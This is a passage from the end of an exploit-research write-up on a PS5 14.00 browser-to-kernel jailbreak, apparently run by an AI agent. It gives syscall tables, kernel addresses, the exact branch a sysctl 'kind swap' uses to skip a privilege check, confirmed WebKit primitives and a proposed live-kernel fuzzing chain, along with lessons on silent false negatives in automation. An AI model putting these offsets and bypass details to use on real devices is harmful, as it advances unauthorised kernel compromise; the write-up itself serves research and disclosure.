4. **`nopoll` is not a leaf function.** It is an 8-byte tail-jump
   (`55 48 89 e5 89 f7 5d e9 84 d9 db ff`). A `ret`-terminated bound walks straight through a
   tail-jump and counts the *next* function's `ret`, so function lengths read long across one.
5. **Stub slots are at `+0x00`, not `+0x08`.** Every stub slot is 8 bytes:
   `e9 <rel32> cc cc cc`, and two stubs sit adjacent for alignment. Referencer arithmetic
   places the slot at `+0x00` (stub `0xffffffff9e656510` ← `0x1ac7cd8` → table `0x1ac7ca0` →
   `+0x38 = fo_close`). `+0x08` is the neighbouring stub.

Three traps in this toolchain repeat easily and are worth stating as rules. `o.imm` arrives
**signed** from capstone, so a TEXT bound computed from it silently yields `call_targets = 0`;
mask with `0xFFFFFFFFFFFFFFFF`. Textual matching on `"-0xc8"` matches unrelated strings that
have nothing to do with the intended offset. And the static-file formula
`VA - 0xffffffff9e3f0000` holds **only inside the static image**: live runtime pointers carry
the modern FreeBSD 13+ KVA prefix `0xffff8e77…`, to which that formula returns nonsense.
**A gate must be run against a known-negative before it is trusted on an unknown.**

### 13.6 CVE existence by direct query

Two CVEs in this note were verified against NVD directly
(`services.nvd.nist.gov/rest/json/cves/2.0`) after a search engine returned nothing for one
of them. The search engine was wrong.

> **For CVE existence, query NVD or MITRE directly. A search engine's null result is not
> evidence of non-existence.**

The same discipline produced the syscall-number correction. The community's "sysctl = 202"
traces to a `syscall_map` with 331 entries in which 199 is absent and 202 is present:
someone matched the map's key 202 against FreeBSD's upstream number without reading the PS5
name table. The PS5 name table says otherwise, and the sysent table agrees:

```
 198  compat6.ftruncate   narg=0  sy_call=0xffffffff9e655760
 199  __sysctl            narg=6  sy_call=0xffffffff9e655a60  -> 0xffffffff9e9481e0
 200  mlock               narg=2  sy_call=0xffffffff9e655a68
 201  munlock             narg=2  sy_call=0xffffffff9e655a70
 202  obs_{               narg=0  sy_call=0xffffffff9e655760
 203  futimes             narg=2  sy_call=0xffffffff9e655a78
 206  poll                narg=3  sy_call=0xffffffff9e655a80
 451  _umtx_op            narg=5  sy_call=0xffffffff9e655600
 454  kmq_open            narg=4  sy_call=0xffffffff9e655a90
```

**[static]** Reproduced on the dump during this engagement. Slot 199's stub resolves to
`0xffffffff9e9481e0`, the `__sysctl` entry identified independently by BFS in §4. Slot 202
is an obsolete entry (`obs_{`) sharing a stub with slot 198.

There is no arithmetic mapping between FreeBSD and PS5 numbering: `fstatfs` 358→394 is +36
and breaks the "−3" rule that fits other slots. **Read the number from the name table, never
from FreeBSD documentation.**

**Two numbering spaces, not one right answer and one wrong.** The framing worth carrying
forward is sharper than "the community got it wrong". Relapse's `syscall_map` and the PS5
native `sysent` table are **two different numbering spaces**, and the collision is that both
contain a key that means `sysctl` in one of them:

| | `sysctl` lives at | The other key means |
|---|---|---|
| Community `syscall_map` | `0x0CA` = **202** | `0xC7` = 199 is **absent** |
| PS5 native `sysent` (13.60) | **199** → `0xffffffff9e655a60` | 202 is `obs_{`, an obsolete slot |

**[static]** `__sysctl | 199 | 0xffffffff9e655a60` confirmed in `sysent-13.60.md`, against
the name-table read and the stub disassembly of §4. The map's own key inventory confirms 199
absent from it.

The hazard is concrete: taking `202` from the community map and handing it to the native table
does not fail: it **calls a different syscall** and returns something. A wrong number here is
not an error; it is a wrong answer. `SYSCTL_NR = 199` is correct for the native table, and
was cross-checked three ways: the PoC's own constant, `sysent-13.60.md`, and an independent
scan resolving `idx 199 → 0xffffffff9e655a60`.

### 13.7 Fuzzing the live kernel from the browser (proposed, not executed)

Upstream's variant analysis closes with a wish: a *"baseline for diffing once someone gains any
14.x read access"* is a chicken-and-egg, since the read access is what the baseline is for. The
chain built here breaks the loop from the other side:

```
code leak -> syscall dal WebProcess -> fuzz syscall 14.00 -> bug kernel
```

With the ROP frame of §6 already reaching six controlled arguments and `sysctl` proven
reachable at 199 (§13.6), the live 14.00 kernel becomes fuzzable **from the browser**, without
the image and without a prior kernel primitive. The syscall surface is the fuzz target; the
crash oracle is the page dying and the synchronous beacon (§13.8) recording exactly where.

Two caveats, so this is not mistaken for a result: **nothing here was executed**: the chain's
first link is the same missing code leak of §12.2, and it is **a route to a bug, not a bug**:
the guide WebProcess may be too constrained for the interesting call classes, and the crash
oracle available from the browser is the same weak oracle discussed in §13.4. It is recorded
because a dead end mapped is more useful to the next reader than one omitted.

### 13.8 The patcher that did not patch: a silent false negative at scale

A transport change in a reporting helper silently disabled **125 of 146** probe modules while the
dashboard kept reporting them as normal. The failure was in the reporting layer, which is exactly
why it was invisible: the thing that would have reported it was the thing that was broken.

**The mechanism.** Every probe module carries its own reporting helper:

```js
function post(ev, d) { /* ... */ }
```

The helper was rewritten from asynchronous `fetch` to **synchronous XHR**: a change that was
correct in principle, and taken from upstream's own comment that a synchronous beacon *"leaves
the renderer before a possible crash in the same call"*. But the rewritten helper had **no
`return` statement**, so it returned `undefined`.

**125 of 146 modules call `post(...).then(...)`.** With `fetch` those calls were chaining onto
a real Promise and worked. With synchronous XHR they chained onto `undefined`:

```
TypeError: undefined is not an object (evaluating 'post("pg_begin", { module: MODNAME, tier: "offsetmap" }).then')
```

**[device]** The signature appears verbatim in the probe log against
`alias-pointer-scan-1400`. The count was confirmed by static analysis of the module corpus at
each generation:

| Corpus generation | Modules | calling `post().then` | with XHR | with `fetch` |
|---|---|---|---|---|
| `pg_tests.json.pre-syncxhr.bak` | 145 | 124 | **4** | 144 |
| `pg_tests.json.pre-postfix.bak` | 146 | **125** | 146 | 24 |
| `pg_tests.json` (fixed) | 146 | 146 | 146 | 24 |

**[static]** Counted over the retained backups, which is why the regression is visible at all.

**The fix** was to return a no-op thenable, so the existing `.then(...)` call sites keep
working against a synchronous transport:

```js
return { then: function (f) { try { if (typeof f === 'function') f(); } catch (e2) {} return this; },
         catch: function (g) { try { if (typeof g === 'function') g(null); } catch (e3) {} return this; } };
```

**146/146 modules patched, zero syntax errors.** The recovery was not cosmetic: **53 modules
came back from `skipped`**, among them `CVE-2026-43715` (FontFaceSet UAF) and
`CVE-2026-43720` (Canvas UAF), modules that had **never actually run on the device** despite
having been swept.

**The second-order lesson: the patcher that patched nothing.** The first attempt at the corpus
rewrite used a regex that held **two levels of nesting**. The helper has three
(`function { fetch( { body: JSON.stringify( {…} ) } ) }`). The regex matched **zero modules**
and it **reported success**.

> **A patcher that does not patch and does not say so is worse than a broken patcher.** A
> broken patcher fails loudly. This one left 145 probes silently in the pre-fix state while
> reporting the job done, and the failure only surfaced because the *next* change made it
> observable.

This is the exploit-development analogue of a test suite that passes because it never ran. It is
worth stating as a general hazard rather than an anecdote: automation that transforms a corpus
reports *what it intended*, and unless the output is independently counted against the input,
"0 files changed" and "145 files changed" both arrive as exit code 0.

**Why the synchronous XHR was worth the trouble anyway.** With asynchronous `fetch`, a run
that crashed the page left **nothing** behind: the beacon was still queued when the renderer
died. With the synchronous transport, every run delivers the **exact point of death**. That is
directly why the FontFace branch in §12.3 could be localised to `document.fonts.load()` at all:
without the synchronous beacon, those fifteen runs would have been fifteen silences, and the
branch would still be open and unexplained.

**A second instance, downstream this time: the tolerant constructor.** The same silent-false-
negative signature reappeared later in the day at the other end of the pipeline. A byte-channel
probe read a length off an object that did not have one:

```
id.length                        -> undefined
new Uint8Array(id.length).length -> 0        <- an EMPTY array, not an error
scan                             -> 0 hits  <- structural false negative
```

**`new Uint8Array(undefined)` does not throw and does not warn: it produces an empty array.** A
wrong type handed to a tolerant constructor yields an emptiness that looks like a result. The
patcher produced its false negative *upstream*: it patched nothing and said it did; this one was
produced *downstream*, inside a constructor that accepts anything. Two different points in the
pipeline, the same silent signature.

The countermeasure is the same lesson applied twice: **report the type alongside the value.** In
the pixel case it was a control that printed length and type separately:

```
CTRL-BASE   len=undefined  type=ImageData
```

**[device]** `pixel-bytewrite-1400`, UA `PlayStation 5/14.00`, and that separate `type`
field is what made the `undefined` visible. Had only the count been reported, the byte channel
would have been written off on an artifact.

**A third instance, and the most instructive: a crash read as a broken primitive.** For most of
the engagement a page dying on a read looked like the primitive failing under some alignment or
permission edge. Under `xotext` (§9) the reading inverts: **the primitive was working
correctly against a protection we did not know was present.** The crash was information, not
noise: it was telling us the address was code and code is not readable. We had the signal the
whole time and had filed it under failures. **[hypothesis]**: the inversion is a re-reading of our own crash log through a mechanism established upstream on `libkernel`; we have not attributed individual crashes to it.

The general form is worth stating: **a crash is a result, and it has to be classified rather
than discarded.** A death attributed to "the primitive is flaky" closes a line of inquiry; the
same death attributed to "the page is execute-only" opens one. The difference is not in the
event, only in what is done with it.

**The canary trap: the most-repeated candidate is the least trustworthy.** From the same upstream
handoff, a detail that cost real runs and generalises badly. When scanning a stack for values that
look like return addresses:

> **25 of 38 candidates** were `libkernel+0x751D0` = **`__stack_chk_guard`**: a *data* word
> copied into many frames, not a return address.

**[upstream]** Independently confirmed there against `OFFSET_lk___stack_chk_guard`. The trap is
the inverse of a strong intuition: a pattern that recurs across many frames *feels* like the
loudest signal available, and here it is the weakest: it recurs precisely because it is a
constant being copied, not because it is the thing being sought. **Frequency is evidence of
persistence, not of identity.** A candidate set that clusters hard on one value should be treated
as having found a constant until proven otherwise.

The three instances share one shape: **the negative was not in the world, it was in the reading
of it.** A helper that returns `undefined`, a constructor that swallows it, a protection that
faults on a legitimate read. In each case the fix was not a better probe but a better
classification of what the probe already returned.

The two facts are the same fact from either side: **the transport determined whether a negative
result was readable.** A crash with no beacon is indistinguishable from a crash that never
happened, and an empty array is indistinguishable from a scan that found nothing.

---


## 14. Related work and novelty survey `[already known]`

The survey was run against primary sources (GitHub's API and raw file endpoints) rather
than a search engine, for the reason given in §13.6.

### 14.1 The community 14.10 corpus

`ZigZagBoi1/PS5-14.10-Research` is the largest body of work in this area: an active community
effort with **2,901 probes, 3,245 captures and 155 merged PRs** at clone time (315 MB, 9,005
paths, 428 documents). It documents the same CVE-2026-43720 canvas reentrancy, the same DAZ
blocker, the same FontFace reclaim leak with the same `+0x58`/`+0x68` offsets, and the same
conclusion that the info leak is "the sole remaining blocker for the entire 14.10 exploit chain".
Our userland findings are consistent with it and, in the `ntfusion` iterator confusion, add a
primitive the corpus does not carry on 14.00.

**On the kind swap, the corpus documents the technique and not the mechanism.** The published
variant analysis describes a `flipOidKind` step: flipping the OID `kind` field from
`0x80048002` to `0x70048002` via a decrement primitive, with the offsets and intended
effect, but not the branch that changes, the privilege skipped, or the fact that `CTLTYPE` is
untouched. A targeted search is the cleanest statement of the gap: grepping all `.md`, `.c`,
`.js` and `.lua` files for `ANYBODY`, `priv_check`, `PRIV_SYSCTL` and `securelevel_gt` returns
**no hit anywhere in connection with the sysctl kind swap**: the hits that exist concern other
handlers entirely (`sys 598`, `sys 612/649`, RDMSR, `PRIV_NETINET_SETHDROPTS`). The corpus's
own sysctl write attempts on 14.10 all returned `-1`, and its own audit re-classifies them
honestly as "one failed write attempt, not a survey proving all sysctl writes blocked".

### 14.2 Relapse

Relapse is the published exploit whose WebKit stage this engagement attempted to port. Its
`syscall_map` is the origin of the "sysctl = 202" error (§13.6); its kernel stage stops at 13.60;
its WebKit stage is dead on 14.00 for the reason established in §11. Its `wk_gadgetmap` did
settle the `pop r8` / `pop r9` question for the browser path (§6).

### 14.3 Upstream FreeBSD

Upstream `sys/kern/kern_sysctl.c`, `sys/sys/sysctl.h` and `sys/sys/priv.h` were the naming
reference for §7.4: the PS5 gate order matches upstream `sysctl_root()` (writable, securelevel,
ANYBODY/privilege, handler, MAC), and the selector constants match (`0x04000000` =
`CTLFLAG_PRISON`, derived `esi` 241/242 = `PRIV_SYSCTL_WRITE`/`PRIV_SYSCTL_WRITEJAIL`). But the
bit values verified **structurally** on the PS5 dump are `0x40000000`, `0x08000000`,
`0x10000000`, `0x04000000`, `0x80000000`: the **names** attached to them are a FreeBSD
convention assumption. The PS5 kernel is a Sony-modified fork; the numbering was not
independently enumerated on the PS5 side.

### 14.4 Novelty verdict

**No prior art found that documents the kind-swap mechanism at branch level.**

What is prior art: the swap **as a technique**: byte values, target offset, intended
read-only→writable effect, published community knowledge carried since 13.60 and described in
the 14.10 corpus's variant analysis; the canvas reentrancy UAF, the FontFace reclaim leak, the
DAZ blocker and the info-leak-is-the-blocker conclusion; and the `wk_gadgetmap` gadget set.

What is **not** prior art, and is contributed here:

1. The specific branch the swap moves: `test eax, 0x10000000` / `je` at `0xffffffff9e947f49`
   and what it guards: the `PRIV_SYSCTL_WRITE`/`PRIV_SYSCTL_WRITEJAIL` check, with the swap
   setting `CTLFLAG_ANYBODY` rather than confusing a type.
2. The CFG proof that the check block has exactly one entry and the swap closes it, with the
   three-way separation of "check denies when executed" / "our OID never executes it" / "the
   swap is load-bearing".
3. The CFI-window census (5,146 windows, exactly one admitting both handlers) locating the
   dispatch site without symbols, and the 303-writable / 332-read-only OID enumeration under the
   corrected offset.
4. The falsification of the type-field amplifier, and that the earlier abandonment rested on the
   wrong offset (`+0x14` not `+0x1c`).
5. The `ntfusion` iterator confusion on 14.00 as a second orthogonal WebKit confusion, scoped
   to **reachability of the confusion path**: not an obtained read/write object.
6. The six closed code-leak branches of §12.3, each closed by a **different** evidence class so
   the set has no shared failure mode, including running upstream's `p563` verbatim to remove
   interpretation as a variable, and a write-channel round-trip that measures where FTZ lives
   instead of inferring it from a null scan.
7. The silent-false-negative case study of §13.8, a methodological result about automated
   exploit development, not about the PS5.
8. The `xotext` constraint on `libkernel_web` established, and the resulting reframe of the code
   leak from *reading code* to *reading data that contains code addresses* (§9), including
   the field-by-field delta stability table showing the deltas are a property of a build family,
   not of the module, and that `thread_list` moves even within 12.xx.

The honest summary: **the swap was known; why it works was not.** This note supplies the
second half, and in doing so narrows what the first half is worth: a permission bypass is a
smaller thing than the folklore's "makes it writable" implies, and a smaller thing stated
precisely is more useful than a larger thing assumed.

### 14.5 Nobody has written the 14.00 answer

A survey of the community's own 14.10 research repository establishes that the 14.00 case is
unaddressed rather than merely unpublished:

```
blob objects scanned                     -> 8 815
references to "14.00" / "14_00"        -> 0
kernel dumps present                   -> docs/dumps_13.60/ only
```

**[static]** Counted over the repository's blob store. The community works on 14.10 and dumps
13.60. **There is no decrypted 14.00 kernel anywhere public, and no written treatment of 14.00
as a distinct target.** This is why the questions in this note have no existing answer to
stand on: the firmware has not been worked, not that the answers were missed.

**Field state, for proportion.** The community corpus carries **2 901 probes** and a working
jailbreak on other firmware lines, and its own summary of the blocker is unchanged across both
eras of the project:

> *"The hard blocker named by both eras is unchanged: **no address of JS-owned memory.**"*

**That is the same wall this note arrives at from a different direction** (§12.4), and the
difference in position is a matter of artifact rather than insight: a live 14.00 console is in
hand, which the surveyed corpus does not have. The blocker is shared; the target is not yet
worked by anyone.

---


## 15. Conclusion `[new]`

Two things were established and one was corrected.

The userland result is a set of confirmed primitives on PS5 14.00 in the guide browser: a
bidirectional canvas UAF, an independent `TransformStream` iterator confusion, a bounded
heap-pointer disclosure, and a ROP frame reaching six controlled system-call arguments, all
bounded by a sandbox that refuses workers with `SecurityError` and has no `SharedArrayBuffer`.

What is missing has not changed, and it is **two gaps, not one**: a WebKit **code leak** is
missing, and a **kernel bug** yielding read/write has not been found, and per §12.2 finding the
leak will not supply one. One caveat travels with every kernel number here: the image analysed is
**13.60**, and while a real 14.00 PUP has since been acquired and identified, **no decrypted
14.00 kernel image exists**: the container key is a single named key away, on a console class
we do not have (§12.1). The device results therefore stand on their own while the kernel
characterisation remains a hypothesis. With a code leak in hand the 14.00 kernel can be
**fuzzed live from the browser** (§13.7), routing around the missing image entirely: a
proposal, not a result.

The most useful product may be neither finding but the discipline behind them: run the gate
against a known negative before trusting it on an unknown; treat a probe that never touched its
subject as having said nothing; and when a null result shows up, check the offset before
concluding the tool has a limit. The six closed branches of §12.3 are worth what they are only
because each was closed by a **different** kind of evidence, and the largest defect found here
was in the engagement's own automation, where a helper missing one `return` quietly broke 125 of
146 probes while they kept reporting normally (§13.8). Automated exploit development reports
what it *intended*; unless output is counted against input, a patch that changed nothing and a
patch that changed everything both exit zero.

---


## References

**Advisories**

- FreeBSD-SA-24:14.umtx: CVE-2024-43102, UMTX_SHM_DESTROY refcount.
  <https://nvd.nist.gov/vuln/detail/CVE-2024-43102>
  (CVSS 3.1 10.0 `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`; advisory
  <https://security.freebsd.org/advisories/FreeBSD-SA-24:14.umtx.asc>)
- FreeBSD-SA-26:19.file: CVE-2026-45251, poll/select fd use-after-free.
  <https://nvd.nist.gov/vuln/detail/CVE-2026-45251>
  (CVSS 3.1 7.8 `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`; advisory
  <https://security.freebsd.org/advisories/FreeBSD-SA-26:19.file.asc>)
- WebKit bug 313175: CVE-2026-43720, `getContext()` re-entrancy.
  <https://bugs.webkit.org/show_bug.cgi?id=313175>
  Upstream fix: <https://github.com/WebKit/WebKit/commit/040ef6e21ffac03b6d6098e0e12354bdb5469ad1>

**Upstream source**

- FreeBSD `sys/kern/kern_sysctl.c`: `sysctl_root()`, permission check chain.
  <https://raw.githubusercontent.com/freebsd/freebsd-src/stable/13/sys/kern/kern_sysctl.c>
- FreeBSD `sys/sys/sysctl.h`: `CTLTYPE`, `CTLFLAG_RD/WR/DORMANT/ANYBODY/SECURE/PRISON`.
  <https://raw.githubusercontent.com/freebsd/freebsd-src/stable/13/sys/sys/sysctl.h>
- FreeBSD `sys/sys/priv.h`: `PRIV_SYSCTL_WRITE` 241, `PRIV_SYSCTL_WRITEJAIL` 242.
  <https://raw.githubusercontent.com/freebsd/freebsd-src/stable/13/sys/sys/priv.h>
- FreeBSD `sys/security/mac/mac_system.c`: `mac_system_check_sysctl()`.
  <https://raw.githubusercontent.com/freebsd/freebsd-src/stable/13/sys/security/mac/mac_system.c>

**Community sources**

- `1nk1/PS5-Prolapse`: working jailbreak, hardware-verified on 13.60.
  <https://github.com/1nk1/PS5-Prolapse>
  - `docs/PROJECT_HANDOFF.md` §9.2: the `xotext` constraint and the parked-stack delta method.
  - `tools/lkfind.js`: signature scanner, method-validated 6/6 against a synthetic image.
  - `tools/lkfind.js` `EXPECT` table: the per-firmware delta values behind the
    field-by-field stability table in §9.3.
- `ZigZagBoi1/PS5-14.10-Research`: community 14.10 research corpus (2,901 probes,
  3,245 captures, 155 merged PRs).
  <https://github.com/ZigZagBoi1/PS5-14.10-Research>
  - `docs/WEBKIT_INFO_LEAK_STRATEGY.md` (2026-10-31): the info-leak blocker.
  - `docs/BROWSER_ENTRY_INFRA_2026-10-19.md`: the shell-domain entry analysis.
  - `docs/research/relapse_variant_analysis.md` (2026-10-18): `flipOidKind`, technique
    without mechanism.
- `kuzibelit/PS5-14.00-14.10-Jailbreak-PoC`: "publapse" AIO lifecycle harness.
  <https://github.com/kuzibelit/PS5-14.00-14.10-Jailbreak-PoC>
- `shad0w-rev/shadow-ps4`: PS4/PS5 exploit hosts, patchsets to 1400.
  <https://github.com/shad0w-rev/shadow-ps4>
- Relapse / `ntfargo`: `syscall_map`, `wk_gadgetmap`, WebKit structured-clone stage.
- `ntfargo` (July 2026): `ntfusion` iterator confusion, PS5 6.00+ / PS4 10.00+.

**Tools**

- Capstone Engine 5.0.7: x86-64 disassembly. <https://www.capstone-engine.org/>
- GNU Binutils `objdump`: binary-target disassembly cross-check.
- AdGuard Home: DNS rewrite for the guide entry path.
  <https://github.com/AdguardTeam/AdGuardHome>

**Engagement evidence (host: `ai-srv:/opt/AGENTS/Ares/engagements/ps5-1400-kernel/`)**

```
ARTIFACT_VERSION_WARNING.md                 <- the 13.60 / 14.10 / 14.00 artifact table (§12.1)
kernel-hunt/syncxhr-and-ptrscan-14.00.md    <- sync XHR + pointer scan (§12.3, §13.8)
kernel-hunt/linedash-offsetmap-stage1-14.00.md  <- lineDash differential method (§12.3)
kernel-hunt/sysent-13.60.md                 <- native syscall table, __sysctl @ 199 (§13.6)
kernel-hunt/suser-enabled-target-14.00.md
kernel-hunt/write-primitive-14.00.md
probe/probe_log.jsonl                       <- raw device log, all runs cited above
probe/pg_tests.json.pre-syncxhr.bak         <- pre-sync-XHR corpus generation
probe/pg_tests.json.pre-postfix.bak         <- the 125-broken-module generation (§13.8)
evidence/ondevice_1400_confirmed.md
evidence/kind_swap_mechanism_verified.md
evidence/kind-swap-abandoned-and-core-baseline.md
evidence/dispatch-and-kind-readers-14.00.md
evidence/permission-check-denies-14.00.md
evidence/oid-walk-falsified.md
evidence/oid-type-survey-and-handler-falsification.md
evidence/kernel-constants-kindswap.md
evidence/two-one-byte-swaps-and-landing-zone.md
evidence/amplifier-hypothesis-falsified.md
evidence/handler-cfi-constraint.md
evidence/sysctl-number-corrected.md
evidence/syscall-table-verified.md
evidence/relapse-offsets-and-ntfusion.md
evidence/community-entry-and-dns-gap.md
evidence/canvas-uaf-43720-live-path.md
evidence/k4_fdtype_vacuous_negatives.md
evidence/cve-records-verified.md
evidence/gate-false-positive-caught.md
evidence/portalgun-shim-and-baseline.md
evidence/engine-bound-and-stripped-build.md
evidence/info-leak-strategy-14x.md
evidence/poc-chain-driver.md
evidence/browser-syscall-binding.md
evidence/d-relative-frame-and-entry-boundary.md
evidence/webkit-1400-final.md
evidence/webkit-entry-portability-1400.md
evidence/jsc-fingerprint-1400.md
evidence/nopoll-exclusion-tblC.md
evidence/fileops-slot-proof-and-retraction.md
evidence/absent-vs-lethal-rule-falsified.md
evidence/bucket-classification-floor.md
evidence/l1-blocked.md
kernel/kernel-13.60-live.bin
CONSOLE_RUNBOOK.md
```


